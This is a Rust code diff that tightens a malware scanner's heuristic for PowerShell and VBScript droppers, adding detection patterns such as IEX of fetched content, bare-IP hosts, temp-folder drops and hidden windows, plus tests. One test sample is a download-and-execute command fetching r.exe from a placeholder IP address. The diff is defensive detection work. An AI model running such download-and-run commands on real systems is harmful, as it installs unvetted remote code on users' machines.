@@ -98,7 +98,13 @@ pub fn script_findings(name: &str, bytes: &[u8]) -> Vec<Finding> {
     }
     let mut out = Vec::new();
     let downloads = has_web_address(&text) && DOWNLOADS.iter().any(|k| text.contains(k));
-    if downloads {
+    // Installers and admin modules also download and run things (PowerShellGet, Windows' own
+    // slmgr.vbs, CI image helpers were the false positives on the clean corpus). They are large
+    // libraries of functions; droppers are short and do one thing. So a download-and-run finding
+    // also needs one strong sign, and is skipped for big function libraries.
+    let library = text.matches("function ").count() + text.matches("\nsub ").count() + text.matches("\nprivate sub ").count() >= 10
+        || bytes.len() > 1024 * 1024;
+    if downloads && !library && strong_download_sign(&text) {
         out.push(finding(
             "builtin.script_download_run",
             "script",
@@ -114,6 +120,26 @@ pub fn script_findings(name: &str, bytes: &[u8]) -> Vec<Finding> {
         ));
     }
     out
+}
+
+/// What separates a dropper from an installer script: it runs what it fetched without saving it
+/// (IEX / eval of the response), fetches from a bare IP address, fetches a program file directly,
+/// or drops into a temp or public folder and starts it there, or hides its window.
+fn strong_download_sign(text: &str) -> bool {
+    let runs_fetched = (text.contains("downloadstring") || text.contains("responsetext") || text.contains("invoke-restmethod") || text.contains("irm "))
+        && ["iex", "invoke-expression", "eval(", "execute(", "executeglobal"].iter().any(|k| text.contains(k));
+    let bare_ip = text.match_indices("http").any(|(i, _)| {
+        let rest = &text[i..];
+        let host = rest.split("://").nth(1).unwrap_or("").split(['/', ':', '"', '\'', ' ', ')']).next().unwrap_or("");
+        host.split('.').count() == 4 && host.split('.').all(|p| !p.is_empty() && p.len() <= 3 && p.bytes().all(|b| b.is_ascii_digit()))
+    });
+    let program_url = text.match_indices("http").any(|(i, _)| {
+        let url = text[i..].split(['"', '\'', ' ', ')', '\n', '\r', '<']).next().unwrap_or("");
+        ["exe", "scr", "dll", "hta", "vbs", "js", "ps1", "bat", "cmd", "msi", "jar"].iter().any(|e| url.ends_with(&format!(".{e}")))
+    });
+    let drops = ["%temp%", "$env:temp", "%appdata%", "$env:appdata", "\\users\\public", "%public%", "getspecialfolder(2)", "c:\\programdata"].iter().any(|k| text.contains(k));
+    let hidden = ["-w hidden", "-windowstyle hidden", ", 0, false", ",0,false", ", 0)", ",0)"].iter().any(|k| text.contains(k));
+    runs_fetched || bare_ip || program_url || drops || hidden
 }
 
 /// Hidden code: a long base64 run with a decoder, or code assembled from hundreds of characters.
@@ -348,6 +374,24 @@ mod tests {
         put(relative); // RELATIVE_PATH (0x08)
         put(args); // ARGUMENTS (0x20)
         b
+    }
+
+    #[test]
+    fn installers_and_admin_libraries_are_not_droppers() {
+        // A module of many functions that downloads a package and starts its installer.
+        let mut lib = String::from("Set-StrictMode -Version 3\n");
+        for i in 0..12 {
+            lib.push_str(&format!("function Step{i} {{ param($Url) Write-Host $Url }}\n"));
+        }
+        lib.push_str("Invoke-WebRequest -Uri https://download.example.org/tool/setup.exe -OutFile $env:TEMP\\setup.exe\nStart-Process $env:TEMP\\setup.exe -Wait\n");
+        assert!(script_findings("InstallHelpers.ps1", lib.as_bytes()).is_empty());
+        // A short script with download and run but no strong sign (a named https host, saved under
+        // the user's own folder, started visibly).
+        let tool = b"Invoke-WebRequest https://example.org/report.csv -OutFile report.csv; Start-Process notepad report.csv";
+        assert!(script_findings("lay-bao-cao.ps1", tool).is_empty());
+        // The same short shape fetching from a bare IP address is a dropper.
+        let ip = b"Invoke-WebRequest http://203.0.113.9/r -OutFile r.exe; Start-Process r.exe";
+        assert_eq!(rules(script_findings("r.ps1", ip)), ["builtin.script_download_run"]);
     }
 
     #[test]
